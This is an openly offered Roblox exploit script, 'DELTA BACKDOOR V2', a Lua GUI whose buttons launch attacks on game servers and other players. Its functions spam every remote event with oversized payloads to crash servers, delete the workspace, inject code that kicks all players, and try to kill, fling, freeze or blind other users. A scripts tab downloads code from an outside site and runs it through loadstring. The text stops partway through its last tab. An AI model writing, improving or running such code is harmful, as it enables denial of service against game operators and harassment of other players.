-- DELTA BACKDOOR V2 - Premium Mobile GUI
-- All functions attempt server-side replication

local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")

local LocalPlayer = Players.LocalPlayer

-- Destroy existing
if game:GetService("CoreGui"):FindFirstChild("DeltaV2") then
    game:GetService("CoreGui"):FindFirstChild("DeltaV2"):Destroy()
end

-- Main ScreenGui
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "DeltaV2"
ScreenGui.Parent = game:GetService("CoreGui")
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

-- Toggle Button (always visible)
local ToggleButton = Instance.new("TextButton")
ToggleButton.Size = UDim2.new(0, 60, 0, 60)
ToggleButton.Position = UDim2.new(1, -70, 0.5, -30)
ToggleButton.BackgroundColor3 = Color3.fromRGB(255, 40, 40)
ToggleButton.Text = "🔥"
ToggleButton.TextSize = 30
ToggleButton.Font = Enum.Font.GothamBold
ToggleButton.TextColor3 = Color3.new(1, 1, 1)
ToggleButton.BorderSizePixel = 0
ToggleButton.Parent = ScreenGui

local ToggleCorner = Instance.new("UICorner", ToggleButton)
ToggleCorner.CornerRadius = UDim.new(1, 0)

local ToggleShadow = Instance.new("ImageLabel", ToggleButton)
ToggleShadow.Size = UDim2.new(1, 20, 1, 20)
ToggleShadow.Position = UDim2.new(0, -10, 0, -10)
ToggleShadow.BackgroundTransparency = 1
ToggleShadow.Image = "rbxassetid://6014261993"
ToggleShadow.ImageColor3 = Color3.new(0, 0, 0)
ToggleShadow.ImageTransparency = 0.5
ToggleShadow.ZIndex = -1

-- Main Frame
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 380, 0, 550)
MainFrame.Position = UDim2.new(0.5, -190, 0.5, -275)
MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Visible = false
MainFrame.Parent = ScreenGui

local MainCorner = Instance.new("UICorner", MainFrame)
MainCorner.CornerRadius = UDim.new(0, 15)

local MainStroke = Instance.new("UIStroke", MainFrame)
MainStroke.Color = Color3.fromRGB(255, 40, 40)
MainStroke.Thickness = 2
MainStroke.Transparency = 0.3

-- Gradient overlay
local Gradient = Instance.new("Frame", MainFrame)
Gradient.Size = UDim2.new(1, 0, 1, 0)
Gradient.BackgroundTransparency = 0.9
Gradient.BorderSizePixel = 0
Gradient.ZIndex = 0

local GradientColor = Instance.new("UIGradient", Gradient)
GradientColor.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(100, 0, 100))
}
GradientColor.Rotation = 45

local GradientCorner = Instance.new("UICorner", Gradient)
GradientCorner.CornerRadius = UDim.new(0, 15)

-- Top Bar
local TopBar = Instance.new("Frame", MainFrame)
TopBar.Size = UDim2.new(1, 0, 0, 50)
TopBar.BackgroundColor3 = Color3.fromRGB(255, 40, 40)
TopBar.BorderSizePixel = 0

local TopCorner = Instance.new("UICorner", TopBar)
TopCorner.CornerRadius = UDim.new(0, 15)

local TopCover = Instance.new("Frame", TopBar)
TopCover.Size = UDim2.new(1, 0, 0, 25)
TopCover.Position = UDim2.new(0, 0, 1, -25)
TopCover.BackgroundColor3 = Color3.fromRGB(255, 40, 40)
TopCover.BorderSizePixel = 0

-- Title
local Title = Instance.new("TextLabel", TopBar)
Title.Size = UDim2.new(0, 200, 1, 0)
Title.Position = UDim2.new(0, 15, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = "DELTA BACKDOOR"
Title.TextColor3 = Color3.new(1, 1, 1)
Title.TextSize = 20
Title.Font = Enum.Font.GothamBold
Title.TextXAlignment = Enum.TextXAlignment.Left

local Subtitle = Instance.new("TextLabel", TopBar)
Subtitle.Size = UDim2.new(0, 200, 0, 15)
Subtitle.Position = UDim2.new(0, 15, 0, 28)
Subtitle.BackgroundTransparency = 1
Subtitle.Text = "Server Control V2"
Subtitle.TextColor3 = Color3.fromRGB(255, 200, 200)
Subtitle.TextSize = 11
Subtitle.Font = Enum.Font.Gotham
Subtitle.TextXAlignment = Enum.TextXAlignment.Left

-- Close Button
local CloseBtn = Instance.new("TextButton", TopBar)
CloseBtn.Size = UDim2.new(0, 40, 0, 40)
CloseBtn.Position = UDim2.new(1, -45, 0, 5)
CloseBtn.BackgroundColor3 = Color3.fromRGB(200, 30, 30)
CloseBtn.Text = "×"
CloseBtn.TextSize = 25
CloseBtn.TextColor3 = Color3.new(1, 1, 1)
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.BorderSizePixel = 0

local CloseCorner = Instance.new("UICorner", CloseBtn)
CloseCorner.CornerRadius = UDim.new(0, 8)

-- Tab Container
local TabContainer = Instance.new("Frame", MainFrame)
TabContainer.Size = UDim2.new(1, -20, 0, 45)
TabContainer.Position = UDim2.new(0, 10, 0, 60)
TabContainer.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
TabContainer.BorderSizePixel = 0

local TabCorner = Instance.new("UICorner", TabContainer)
TabCorner.CornerRadius = UDim.new(0, 10)

local TabLayout = Instance.new("UIListLayout", TabContainer)
TabLayout.FillDirection = Enum.FillDirection.Horizontal
TabLayout.Padding = UDim.new(0, 5)
TabLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
TabLayout.VerticalAlignment = Enum.VerticalAlignment.Center

-- Content Container
local ContentContainer = Instance.new("ScrollingFrame", MainFrame)
ContentContainer.Size = UDim2.new(1, -20, 1, -125)
ContentContainer.Position = UDim2.new(0, 10, 0, 115)
ContentContainer.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
ContentContainer.BorderSizePixel = 0
ContentContainer.ScrollBarThickness = 4
ContentContainer.ScrollBarImageColor3 = Color3.fromRGB(255, 40, 40)

local ContentCorner = Instance.new("UICorner", ContentContainer)
ContentCorner.CornerRadius = UDim.new(0, 10)

local ContentLayout = Instance.new("UIListLayout", ContentContainer)
ContentLayout.Padding = UDim.new(0, 6)
ContentLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
ContentLayout.SortOrder = Enum.SortOrder.LayoutOrder

-- Helper Functions
local function Tween(obj, props, time)
    TweenService:Create(obj, TweenInfo.new(time or 0.3, Enum.EasingStyle.Quad), props):Play()
end

local function FireAllRemotes(...)
    local args = {...}
    for _, obj in pairs(game:GetDescendants()) do
        if obj:IsA("RemoteEvent") then
            spawn(function()
                pcall(function()
                    obj:FireServer(unpack(args))
                end)
            end)
        end
    end
end

local function InvokeAllRemotes(...)
    local args = {...}
    for _, obj in pairs(game:GetDescendants()) do
        if obj:IsA("RemoteFunction") then
            spawn(function()
                pcall(function()
                    obj:InvokeServer(unpack(args))
                end)
            end)
        end
    end
end

local function Notify(text)
    local NotifFrame = Instance.new("Frame", ScreenGui)
    NotifFrame.Size = UDim2.new(0, 300, 0, 60)
    NotifFrame.Position = UDim2.new(0.5, -150, 1, 0)
    NotifFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    NotifFrame.BorderSizePixel = 0
    
    local NotifCorner = Instance.new("UICorner", NotifFrame)
    NotifCorner.CornerRadius = UDim.new(0, 10)
    
    local NotifStroke = Instance.new("UIStroke", NotifFrame)
    NotifStroke.Color = Color3.fromRGB(255, 40, 40)
    NotifStroke.Thickness = 2
    
    local NotifText = Instance.new("TextLabel", NotifFrame)
    NotifText.Size = UDim2.new(1, -20, 1, 0)
    NotifText.Position = UDim2.new(0, 10, 0, 0)
    NotifText.BackgroundTransparency = 1
    NotifText.Text = text
    NotifText.TextColor3 = Color3.new(1, 1, 1)
    NotifText.TextSize = 14
    NotifText.Font = Enum.Font.Gotham
    NotifText.TextWrapped = true
    
    Tween(NotifFrame, {Position = UDim2.new(0.5, -150, 1, -80)}, 0.5)
    
    wait(3)
    Tween(NotifFrame, {Position = UDim2.new(0.5, -150, 1, 0)}, 0.5)
    wait(0.5)
    NotifFrame:Destroy()
end

local function CreateSection(text)
    local Section = Instance.new("TextLabel")
    Section.Size = UDim2.new(0.96, 0, 0, 35)
    Section.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    Section.Text = "  " .. text
    Section.TextColor3 = Color3.fromRGB(255, 200, 50)
    Section.TextSize = 15
    Section.Font = Enum.Font.GothamBold
    Section.TextXAlignment = Enum.TextXAlignment.Left
    Section.Parent = ContentContainer
    
    local SecCorner = Instance.new("UICorner", Section)
    SecCorner.CornerRadius = UDim.new(0, 8)
    
    local SecStroke = Instance.new("UIStroke", Section)
    SecStroke.Color = Color3.fromRGB(255, 200, 50)
    SecStroke.Thickness = 1
    SecStroke.Transparency = 0.7
    
    ContentContainer.CanvasSize = UDim2.new(0, 0, 0, ContentLayout.AbsoluteContentSize.Y + 10)
end

local function CreateButton(text, icon, callback)
    local Button = Instance.new("TextButton")
    Button.Size = UDim2.new(0.96, 0, 0, 45)
    Button.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    Button.Text = ""
    Button.Font = Enum.Font.Gotham
    Button.TextSize = 14
    Button.TextColor3 = Color3.new(1, 1, 1)
    Button.Parent = ContentContainer
    Button.AutoButtonColor = false
    
    local BtnCorner = Instance.new("UICorner", Button)
    BtnCorner.CornerRadius = UDim.new(0, 8)
    
    local BtnStroke = Instance.new("UIStroke", Button)
    BtnStroke.Color = Color3.fromRGB(255, 40, 40)
    BtnStroke.Thickness = 1
    BtnStroke.Transparency = 0.8
    
    local Icon = Instance.new("TextLabel", Button)
    Icon.Size = UDim2.new(0, 35, 1, 0)
    Icon.BackgroundTransparency = 1
    Icon.Text = icon
    Icon.TextSize = 20
    Icon.Font = Enum.Font.GothamBold
    Icon.TextColor3 = Color3.fromRGB(255, 40, 40)
    
    local Label = Instance.new("TextLabel", Button)
    Label.Size = UDim2.new(1, -40, 1, 0)
    Label.Position = UDim2.new(0, 40, 0, 0)
    Label.BackgroundTransparency = 1
    Label.Text = text
    Label.TextSize = 13
    Label.Font = Enum.Font.Gotham
    Label.TextColor3 = Color3.new(1, 1, 1)
    Label.TextXAlignment = Enum.TextXAlignment.Left
    
    Button.MouseEnter:Connect(function()
        Tween(Button, {BackgroundColor3 = Color3.fromRGB(50, 50, 50)}, 0.2)
        Tween(BtnStroke, {Transparency = 0.3}, 0.2)
    end)
    
    Button.MouseLeave:Connect(function()
        Tween(Button, {BackgroundColor3 = Color3.fromRGB(40, 40, 40)}, 0.2)
        Tween(BtnStroke, {Transparency = 0.8}, 0.2)
    end)
    
    Button.MouseButton1Click:Connect(function()
        Tween(Button, {BackgroundColor3 = Color3.fromRGB(255, 40, 40)}, 0.1)
        wait(0.1)
        Tween(Button, {BackgroundColor3 = Color3.fromRGB(40, 40, 40)}, 0.1)
        spawn(callback)
        Notify("Executed: " .. text)
    end)
    
    ContentContainer.CanvasSize = UDim2.new(0, 0, 0, ContentLayout.AbsoluteContentSize.Y + 10)
    return Button
end

local function CreateToggle(text, icon, callback)
    local state = false
    local Toggle = Instance.new("Frame")
    Toggle.Size = UDim2.new(0.96, 0, 0, 45)
    Toggle.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    Toggle.Parent = ContentContainer
    
    local TogCorner = Instance.new("UICorner", Toggle)
    TogCorner.CornerRadius = UDim.new(0, 8)
    
    local Icon = Instance.new("TextLabel", Toggle)
    Icon.Size = UDim2.new(0, 35, 1, 0)
    Icon.BackgroundTransparency = 1
    Icon.Text = icon
    Icon.TextSize = 20
    Icon.Font = Enum.Font.GothamBold
    Icon.TextColor3 = Color3.fromRGB(255, 40, 40)
    
    local Label = Instance.new("TextLabel", Toggle)
    Label.Size = UDim2.new(1, -90, 1, 0)
    Label.Position = UDim2.new(0, 40, 0, 0)
    Label.BackgroundTransparency = 1
    Label.Text = text
    Label.TextSize = 13
    Label.Font = Enum.Font.Gotham
    Label.TextColor3 = Color3.new(1, 1, 1)
    Label.TextXAlignment = Enum.TextXAlignment.Left
    
    local Switch = Instance.new("TextButton", Toggle)
    Switch.Size = UDim2.new(0, 45, 0, 25)
    Switch.Position = UDim2.new(1, -55, 0.5, -12.5)
    Switch.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    Switch.Text = ""
    Switch.AutoButtonColor = false
    
    local SwitchCorner = Instance.new("UICorner", Switch)
    SwitchCorner.CornerRadius = UDim.new(1, 0)
    
    local Circle = Instance.new("Frame", Switch)
    Circle.Size = UDim2.new(0, 21, 0, 21)
    Circle.Position = UDim2.new(0, 2, 0.5, -10.5)
    Circle.BackgroundColor3 = Color3.new(1, 1, 1)
    
    local CircleCorner = Instance.new("UICorner", Circle)
    CircleCorner.CornerRadius = UDim.new(1, 0)
    
    Switch.MouseButton1Click:Connect(function()
        state = not state
        if state then
            Tween(Circle, {Position = UDim2.new(1, -23, 0.5, -10.5)}, 0.2)
            Tween(Switch, {BackgroundColor3 = Color3.fromRGB(50, 255, 50)}, 0.2)
        else
            Tween(Circle, {Position = UDim2.new(0, 2, 0.5, -10.5)}, 0.2)
            Tween(Switch, {BackgroundColor3 = Color3.fromRGB(60, 60, 60)}, 0.2)
        end
        callback(state)
    end)
    
    ContentContainer.CanvasSize = UDim2.new(0, 0, 0, ContentLayout.AbsoluteContentSize.Y + 10)
end

-- Tab System
local currentTab = nil
local tabs = {}

local function CreateTab(name, icon)
    local TabButton = Instance.new("TextButton")
    TabButton.Size = UDim2.new(0, 70, 1, -10)
    TabButton.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    TabButton.Text = icon .. "\n" .. name
    TabButton.TextSize = 10
    TabButton.Font = Enum.Font.GothamBold
    TabButton.TextColor3 = Color3.fromRGB(150, 150, 150)
    TabButton.Parent = TabContainer
    TabButton.AutoButtonColor = false
    
    local TabCorner = Instance.new("UICorner", TabButton)
    TabCorner.CornerRadius = UDim.new(0, 8)
    
    tabs[name] = {button = TabButton, content = {}}
    
    TabButton.MouseButton1Click:Connect(function()
        for tabName, tab in pairs(tabs) do
            Tween(tab.button, {
                BackgroundColor3 = Color3.fromRGB(35, 35, 35),
                TextColor3 = Color3.fromRGB(150, 150, 150)
            }, 0.2)
        end
        
        Tween(TabButton, {
            BackgroundColor3 = Color3.fromRGB(255, 40, 40),
            TextColor3 = Color3.new(1, 1, 1)
        }, 0.2)
        
        for _, child in pairs(ContentContainer:GetChildren()) do
            if child:IsA("GuiObject") then
                child:Destroy()
            end
        end
        
        currentTab = name
        for _, item in pairs(tabs[name].content) do
            item()
        end
    end)
    
    return function(buildFunc)
        table.insert(tabs[name].content, buildFunc)
    end
end

-- Create Tabs
local DestructionTab = CreateTab("Destroy", "💥")
local EffectsTab = CreateTab("FX", "✨")
local SoundTab = CreateTab("Sound", "🔊")
local PlayerTab = CreateTab("Player", "👥")
local ScriptTab = CreateTab("Scripts", "📜")
local MiscTab = CreateTab("Misc", "⚙️")

-- DESTRUCTION TAB
DestructionTab(function()
    CreateSection("🔥 SERVER DESTRUCTION")
    
    CreateButton("Ultimate Server Crash", "💣", function()
        spawn(function()
            while wait() do
                for i = 1, 1000 do
                    local p = Instance.new("Part", Workspace)
                    p.Size = Vector3.new(500, 500, 500)
                    p.Position = Vector3.new(math.random(-10000, 10000), 5000, math.random(-10000, 10000))
                    p.Anchored = false
                    p.CanCollide = true
                end
                FireAllRemotes(string.rep("CRASH", 10000))
                InvokeAllRemotes(string.rep("OVERFLOW", 10000))
            end
        end)
    end)
    
    CreateButton("Mass Remote Spam", "🌊", function()
        spawn(function()
            while wait() do
                for i = 1, 500 do
                    FireAllRemotes(
                        string.rep("DELTA", 5000),
                        math.huge,
                        -math.huge,
                        {string.rep("A", 10000)}
                    )
                    InvokeAllRemotes(string.rep("B", 5000))
                end
            end
        end)
    end)
    
    CreateButton("Network Flood Attack", "📡", function()
        spawn(function()
            while wait() do
                for i = 1, 300 do
                    FireAllRemotes(
                        string.rep("FLOOD", 20000),
                        string.rep("PACKET", 20000),
                        string.rep("SPAM", 20000)
                    )
                end
            end
        end)
    end)
    
    CreateButton("Memory Overflow", "💾", function()
        spawn(function()
            local crash = {}
            while wait(0.05) do
                for i = 1, 2000 do
                    table.insert(crash, Instance.new("Part"))
                    crash[#crash].Size = Vector3.new(math.random(1, 1000), math.random(1, 1000), math.random(1, 1000))
                end
                FireAllRemotes(crash)
            end
        end)
    end)
    
    CreateButton("Infinite Part Spam", "🧱", function()
        spawn(function()
            while wait(0.05) do
                for i = 1, 800 do
                    local p = Instance.new("Part", Workspace)
                    p.Size = Vector3.new(100, 100, 100)
                    p.Position = Vector3.new(math.random(-8000, 8000), math.random(0, 5000), math.random(-8000, 8000))
                    p.Anchored = false
                    p.Material = Enum.Material.Neon
                    p.BrickColor = BrickColor.Random()
                    p.CanCollide = true
                    
                    local fire = Instance.new("Fire", p)
                    fire.Size = 30
                    local smoke = Instance.new("Smoke", p)
                    smoke.Size = 30
                end
            end
        end)
    end)
    
    CreateButton("Exploit All Remotes", "🎯", function()
        local exploits = {
            "kick", "ban", "kill", "damage", "admin", "owner",
            "give", "money", "cash", "coins", "points",
            999999999, -999999999, math.huge, -math.huge,
            true, false, nil, "",
            "teleport", "god", "heal", "respawn"
        }
        spawn(function()
            while wait(0.2) do
                for _, exp in pairs(exploits) do
                    FireAllRemotes(exp)
                    InvokeAllRemotes(exp)
                    FireAllRemotes(exp, "all")
                    FireAllRemotes("all", exp)
                end
            end
        end)
    end)
    
    CreateButton("Workspace Destroyer", "🗑️", function()
        spawn(function()
            while wait(1) do
                for _, obj in pairs(Workspace:GetDescendants()) do
                    if obj:IsA("Model") or obj:IsA("Part") then
                        pcall(function()
                            obj:Destroy()
                        end)
                    end
                end
            end
        end)
    end)
    
    CreateButton("Script Injection Attempt", "💉", function()
        local malicious = [[
            while wait() do
                for _, p in pairs(game.Players:GetPlayers()) do
                    p:Kick("DELTA BACKDOOR")
                end
            end
        ]]
        FireAllRemotes("script", malicious)
        FireAllRemotes("execute", malicious)
        FireAllRemotes("run", malicious)
        InvokeAllRemotes(malicious)
    end)
end)

-- EFFECTS TAB
EffectsTab(function()
    CreateSection("✨ VISUAL EFFECTS")
    
    CreateButton("Disco Apocalypse", "🎆", function()
        spawn(function()
            while wait() do
                Lighting.Ambient = Color3.new(math.random(), math.random(), math.random())
                Lighting.OutdoorAmbient = Color3.new(math.random(), math.random(), math.random())
                Lighting.ColorShift_Top = Color3.new(math.random(), math.random(), math.random())
                Lighting.ColorShift_Bottom = Color3.new(math.random(), math.random(), math.random())
                Lighting.Brightness = math.random(0, 10)
                Lighting.ClockTime = math.random(0, 24)
            end
        end)
    end)
    
    CreateButton("Particle Hell", "🎨", function()
        for _, part in pairs(Workspace:GetDescendants()) do
            if part:IsA("BasePart") then
                spawn(function()
                    pcall(function()
                        for i = 1, 5 do
                            local p = Instance.new("ParticleEmitter", part)
                            p.Texture = "rbxasset://textures/particles/sparkles_main.dds"
                            p.Rate = 1000
                            p.Lifetime = NumberRange.new(10)
                            p.Speed = NumberRange.new(100)
                            p.SpreadAngle = Vector2.new(180, 180)
                            p.Color = ColorSequence.new(Color3.new(math.random(), math.random(), math.random()))
                        end
                    end)
                end)
            end
        end
    end)
    
    CreateButton("Seizure Mode", "⚡", function()
        spawn(function()
            while wait() do
                Lighting.Brightness = math.random(0, 10)
                for _, v in pairs(Workspace:GetDescendants()) do
                    if v:IsA("BasePart") then
                        v.Color = Color3.new(math.random(), math.random(), math.random())
                        v.Material = Enum.Material[({
                            "Neon", "ForceField", "Glass", "Plastic"
                        })[math.random(1, 4)]]
                    end
                end
            end
        end)
    end)
    
    CreateButton("Fog Storm", "🌫️", function()
        spawn(function()
            while wait(0.1) do
                Lighting.FogEnd = math.random(5, 50)
                Lighting.FogColor = Color3.new(math.random(), math.random(), math.random())
            end
        end)
    end)
    
    CreateButton("Sky Corruption", "🌌", function()
        for i = 1, 10 do
            local sky = Instance.new("Sky", Lighting)
            spawn(function()
                while wait(0.3) do
                    sky.SkyboxBk = "rbxassetid://"..math.random(1000000, 9999999)
                    sky.SkyboxDn = "rbxassetid://"..math.random(1000000, 9999999)
                    sky.SkyboxFt = "rbxassetid://"..math.random(1000000, 9999999)
                    sky.SkyboxLf = "rbxassetid://"..math.random(1000000, 9999999)
                    sky.SkyboxRt = "rbxassetid://"..math.random(1000000, 9999999)
                    sky.SkyboxUp = "rbxassetid://"..math.random(1000000, 9999999)
                end
            end)
        end
    end)
    
    CreateButton("Explosion Spam", "💥", function()
        spawn(function()
            while wait(0.1) do
                for i = 1, 20 do
                    local exp = Instance.new("Explosion", Workspace)
                    exp.Position = Vector3.new(math.random(-1000, 1000), math.random(0, 500), math.random(-1000, 1000))
                    exp.BlastRadius = 100
                    exp.BlastPressure = 1000000
                end
            end
        end)
    end)
    
    CreateButton("Rainbow Everything", "🌈", function()
        spawn(function()
            while wait() do
                local hue = tick() % 5 / 5
                local color = Color3.fromHSV(hue, 1, 1)
                for _, v in pairs(Workspace:GetDescendants()) do
                    if v:IsA("BasePart") then
                        v.Color = color
                    end
                end
                Lighting.Ambient = color
            end
        end)
    end)
    
    CreateButton("Decal Spam", "🖼️", function()
        local decals = {
            "6864086690", "6864430163", "6864430291",
            "142376088", "1843463175"
        }
        for _, part in pairs(Workspace:GetDescendants()) do
            if part:IsA("BasePart") then
                for i = 1, 6 do
                    local d = Instance.new("Decal", part)
                    d.Texture = "rbxassetid://"..decals[math.random(1, #decals)]
                    d.Face = Enum.NormalId[({
                        "Front", "Back", "Left", "Right", "Top", "Bottom"
                    })[i]]
                end
            end
        end
    end)
end)

-- SOUND TAB
SoundTab(function()
    CreateSection("🔊 AUDIO CHAOS")
    
    local soundIds = {
        142376088, 1837849285, 5816432987, 566399014,
        189490703, 6928186463, 5074449746, 1843463175,
        4713641347, 2863807759
    }
    
    CreateButton("Earrape Hell", "📢", function()
        for i = 1, 100 do
            local s = Instance.new("Sound", Workspace)
            s.SoundId = "rbxassetid://"..soundIds[math.random(1, #soundIds)]
            s.Volume = 10
            s.Looped = true
            s.PlaybackSpeed = math.random(5, 20) / 10
            s:Play()
        end
    end)
    
    CreateButton("Random Sound Flood", "🎵", function()
        spawn(function()
            while wait(0.02) do
                local s = Instance.new("Sound", Workspace)
                s.SoundId = "rbxassetid://"..math.random(1000000, 9999999)
                s.Volume = 10
                s:Play()
                game.Debris:AddItem(s, 0.5)
            end
        end)
    end)
    
    CreateButton("Distort All Audio", "🎛️", function()
        for _, s in pairs(game:GetDescendants()) do
            if s:IsA("Sound") then
                s.PlaybackSpeed = math.random(1, 100) / 10
                s.Volume = 10
                s.Looped = true
                s:Play()
            end
        end
    end)
    
    CreateButton("Bass Boosted Spam", "🔉", function()
        for i = 1, 50 do
            local s = Instance.new("Sound", Workspace)
            s.SoundId = "rbxassetid://5816432987"
            s.Volume = 10
            s.Looped = true
            
            local eq = Instance.new("EqualizerSoundEffect", s)
            eq.LowGain = 10
            eq.MidGain = -20
            eq.HighGain = -20
            
            s:Play()
        end
    end)
    
    CreateButton("Reverse Audio Chaos", "⏪", function()
        for _, s in pairs(game:GetDescendants()) do
            if s:IsA("Sound") then
                s.PlaybackSpeed = -math.random(1, 30) / 10
                s:Play()
            end
        end
    end)
    
    CreateButton("Nightcore Mode", "🎤", function()
        for _, s in pairs(game:GetDescendants()) do
            if s:IsA("Sound") then
                s.PlaybackSpeed = 1.3
                local pitch = Instance.new("PitchShiftSoundEffect", s)
                pitch.Octave = 1.3
                s:Play()
            end
        end
    end)
    
    CreateButton("Stop All Sounds", "🔇", function()
        for _, s in pairs(game:GetDescendants()) do
            if s:IsA("Sound") then
                s:Stop()
                s:Destroy()
            end
        end
    end)
end)

-- PLAYER TAB
PlayerTab(function()
    CreateSection("👥 PLAYER CONTROL")
    
    CreateButton("Kick All Players", "👢", function()
        for _, p in pairs(Players:GetPlayers()) do
            if p ~= LocalPlayer then
                FireAllRemotes("kick", p)
                FireAllRemotes(p, "kick")
                FireAllRemotes("Kick", p.Name)
                FireAllRemotes(p.UserId, "kick")
                InvokeAllRemotes("kick", p)
            end
        end
    end)
    
    CreateButton("Kill All Players", "💀", function()
        FireAllRemotes("kill", "all")
        FireAllRemotes("damage", "all", math.huge)
        for _, p in pairs(Players:GetPlayers()) do
            FireAllRemotes("kill", p)
            FireAllRemotes(p, "kill")
            FireAllRemotes("damage", p, 999999)
            FireAllRemotes(p.Character, 0, "Health")
        end
    end)
    
    CreateButton("Teleport All to You", "📍", function()
        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            local pos = LocalPlayer.Character.HumanoidRootPart.Position
            FireAllRemotes("teleport", "all", pos)
            FireAllRemotes("tp", "all", CFrame.new(pos))
            FireAllRemotes(CFrame.new(pos), "all")
            for _, p in pairs(Players:GetPlayers()) do
                FireAllRemotes("teleport", p, pos)
                FireAllRemotes(p, CFrame.new(pos))
            end
        end
    end)
    
    CreateButton("Fling All Players", "🌪️", function()
        local fling = Vector3.new(math.random(-10000, 10000), 20000, math.random(-10000, 10000))
        FireAllRemotes("fling", "all")
        FireAllRemotes("velocity", fling)
        FireAllRemotes(fling, "all")
        for _, p in pairs(Players:GetPlayers()) do
            FireAllRemotes("fling", p)
            FireAllRemotes(p, fling)
        end
    end)
    
    CreateButton("Freeze All Players", "❄️", function()
        FireAllRemotes("freeze", "all")
        FireAllRemotes("walkspeed", "all", 0)
        for _, p in pairs(Players:GetPlayers()) do
            FireAllRemotes("freeze", p)
            FireAllRemotes(p, "freeze")
            FireAllRemotes("walkspeed", p, 0)
        end
    end)
    
    CreateButton("Blind All Players", "👁️", function()
        local blind = Instance.new("ScreenGui")
        local frame = Instance.new("Frame", blind)
        frame.Size = UDim2.new(1, 0, 1, 0)
        frame.BackgroundColor3 = Color3.new(0, 0, 0)
        
        FireAllRemotes("blind", "all")
        for _, p in pairs(Players:GetPlayers()) do
            if p ~= LocalPlayer then
                FireAllRemotes("gui", p, blind:Clone())
            end
        end
    end)
    
    CreateButton("Spam Chat Messages", "💬", function()
        spawn(function()
            while wait(0.5) do
                FireAllRemotes("chat", "HACKED BY DELTA")
                FireAllRemotes("message", "SERVER COMPROMISED")
                for _, p in pairs(Players:GetPlayers()) do
                    FireAllRemotes("chat", p, "I GOT HACKED")
                end
            end
        end)
    end)
    
    CreateButton("Give All Admin (Attempt)", "👑", function()
        for _, p in pairs(Players:GetPlayers()) do
            FireAllRemotes("admin", p)
            FireAllRemotes("makeadmin", p)
            FireAllRemotes("promote", p, "admin")
            FireAllRemotes(":admin", p.Name)
        end
    end)
end)

-- SCRIPTBLOX TAB
ScriptTab(function()
    CreateSection("📜 SCRIPTBLOX SEARCH")
    
    local SearchBox = Instance.new("TextBox")
    SearchBox.Size = UDim2.new(0.96, 0, 0, 45)
    SearchBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    SearchBox.PlaceholderText = "Search scripts..."
    SearchBox.Text = ""
    SearchBox.TextColor3 = Color3.new(1, 1, 1)
    SearchBox.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
    SearchBox.TextSize = 14
    SearchBox.Font = Enum.Font.Gotham
    SearchBox.Parent = ContentContainer
    
    local SearchCorner = Instance.new("UICorner", SearchBox)
    SearchCorner.CornerRadius = UDim.new(0, 8)
    
    local SearchStroke = Instance.new("UIStroke", SearchBox)
    SearchStroke.Color = Color3.fromRGB(255, 40, 40)
    SearchStroke.Thickness = 2
    
    CreateButton("Search Scripts", "🔍", function()
        local query = SearchBox.Text
        if query ~= "" then
            local success, result = pcall(function()
                return game:HttpGet("https://scriptblox.com/api/script/search?q="..HttpService:UrlEncode(query))
            end)
            
            if success then
                local data = HttpService:JSONDecode(result)
                if data.result and data.result.scripts then
                    CreateSection("📝 SEARCH RESULTS")
                    for i, script in pairs(data.result.scripts) do
                        if i <= 15 then
                            CreateButton(
                                script.title or "Script #"..i,
                                "▶️",
                                function()
                                    if script.script then
                                        loadstring(script.script)()
                                    elseif script.scriptUrl then
                                        loadstring(game:HttpGet(script.scriptUrl))()
                                    end
                                end
                            )
                        end
                    end
                end
            end
        end
    end)
    
    CreateSection("🔥 POPULAR SCRIPTS")
    
    CreateButton("Load Popular Scripts", "⭐", function()
        local success, result = pcall(function()
            return game:HttpGet("https://scriptblox.com/api/script/search?q=universal")
        end)
        
        if success then
            local data = HttpService:JSONDecode(result)
            if data.result and data.result.scripts then
                CreateSection("📊 TOP SCRIPTS")
                for i, script in pairs(data.result.scripts) do
                    if i <= 10 then
                        CreateButton(
                            script.title or "Script #"..i,
                            "🎯",
                            function()
                                if script.script then
                                    loadstring(script.script)()
                                elseif script.scriptUrl then
                                    loadstring(game:HttpGet(script.scriptUrl))()
                                end
                            end
                        )
                    end
                end
            end
        end
    end)
    
    local gameId = game.PlaceId
    CreateButton("Load Game-Specific Scripts", "🎮", function()
        local success, result = pcall(function()
            return game:HttpGet("https://scriptblox.com/api/script/search?q="..tostring(gameId))
        end)
        
        if success then
            local data = HttpService:JSONDecode(result)
            if data.result and data.result.scripts then
                CreateSection("🎯 GAME SCRIPTS")
                for i, script in pairs(data.result.scripts) do
                    if i <= 10 then
                        CreateButton(
                            script.title or "Script #"..i,
                            "⚡",
                            function()
                                if script.script then
                                    loadstring(script.script)()
                                elseif script.scriptUrl then
                                    loadstring(game:HttpGet(script.scriptUrl))()
                                end
                            end
                        )
                    end
                end
            end
        end
    end)
end)

-- MISC TAB
MiscTab(function()
    CreateSection("⚙️ MISCELLANEOUS")
    
    CreateButton("Delete Terrain", "🗻", function()
        pcall(function()
            Workspace.Terrain:Clear()
        end)
    end)
    
